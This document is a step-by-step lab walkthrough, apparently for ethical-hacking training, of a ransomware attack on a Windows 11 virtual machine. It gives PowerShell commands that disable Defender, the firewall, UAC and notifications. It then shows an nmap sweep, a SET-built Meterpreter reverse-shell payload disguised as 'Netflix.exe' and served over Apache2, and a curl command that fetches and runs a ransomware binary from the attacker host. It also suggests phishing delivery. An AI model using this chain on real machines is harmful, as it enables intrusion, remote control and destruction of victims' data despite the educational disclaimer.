# Ransomware Training Project Live Lab
Environment Structure
Virtualization
Platform: VirtualBox
Network Components
Firewall/Router: pfSense
Systems
Attacker Machine: Kali Linux (on the same LAN as the target)
Target Machine: PC11 with Windows 11 (on the same LAN as the attacker)
Tools Used
Metasploit: For exploit development and payload deployment
Meterpreter: For post-exploitation and reverse shell capabilities
SET Toolkit (Social Engineering Toolkit): To simulate social engineering attacks
Apache2: For hosting payloads and web-based attack vectors
PowerShell: For executing commands on Windows to disable security features and set up the reverse shell
Project Overview and Observations
The initial step in this project is to ensure that both virtual machines (attacker and target) are on the same network to avoid complexities. This configuration avoids the need for inter-LAN attacks, which would require advanced configurations like separate LANs and routing.

Disabling Security Features on Target
To prepare the Windows 11 VM, several PowerShell commands with administrative privileges are run to disable key security components:

Disable Windows Defender Real-Time Monitoring:

powershell
Copy code
Set-MpPreference -DisableRealtimeMonitoring $true
Disable Windows Firewall:

powershell
Copy code
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Disable User Account Control (UAC):

powershell
Copy code
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Suppress Windows Security Notifications:

powershell
Copy code
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_TOASTS_ENABLED" -Value 0 -PropertyType DWORD -Force
After these commands, check the Windows Security UI for alerts and verify that key security features are disabled (e.g., Firewall, Virus protection, UAC, Tamper Protection).

Additional Manual Steps
Some features need manual configuration:

Disable Microsoft Defender SmartScreen:

Go to Windows Security > App & Browser Control.
Turn off Check apps and files and SmartScreen for Microsoft Edge.
Disable Tamper Protection:

Go to Windows Security > Virus & threat protection settings.
Deploying the Setup
You can compile PowerShell scripts or commands into a .ps1 file. Social engineering methods (like phishing or Trojan-style embedding) may be used to execute the script.

Network Scanning
Identify the IP Address of the Kali machine to understand the subnet.
Nmap Scan on LAN IP range 192.168.1.0/24:
bash
Copy code
nmap -sV 192.168.1.0/24
This scan identifies network endpoints, IP addresses, open ports, and services, helping locate the Windows machine.
Creating the Payload
Using the Social Engineering Toolkit (SET):

Launch SET and choose:
Option 1: Social Engineering
Option 4: Create a payload and listener
Option 2: Windows Reverse_TCP Meterpreter
Configure the payload:
Enter the IP address of your Kali machine.
Use a port, e.g., 88.
Running Apache2
The Apache2 server hosts the payload:

Check Apache2 Status:
bash
Copy code
service apache2 status
Copy the Payload:
bash
Copy code
cp /root/.set/payload.exe /var/www/html/Netflix.exe
Start Apache2 Server:
bash
Copy code
service apache2 start
Setting Up the Listener
Return to the terminal where the payload listener prompt was left open. Confirm by entering yes to load the listener in msfconsole:

bash
Copy code
msf6 exploit(multi/handler) >
Downloading and Running the Payload
To access the payload, download it on the Windows machine from the LAN address:

plaintext
Copy code
192.168.1.102/Netflix.exe
Executing the Shell and Ransomware Attack
After executing the payload, connect to the session with Meterpreter:

bash
Copy code
sessions -i 1
Download Ransomware Payload:
bash
Copy code
curl -O 192.168.1.102/CashCat.exe
Execute the Ransomware:
bash
Copy code
start CashCat.exe
This encrypts files with an extension (e.g., .porno), making them unusable. To decrypt:

plaintext
Copy code
123456789
Disclaimer
This demonstration is strictly for educational purposes, showcasing ethical hacking practices. The project emphasizes proficiency with cybersecurity tools, scripting languages, and general knowledge of cybersecurity techniques.

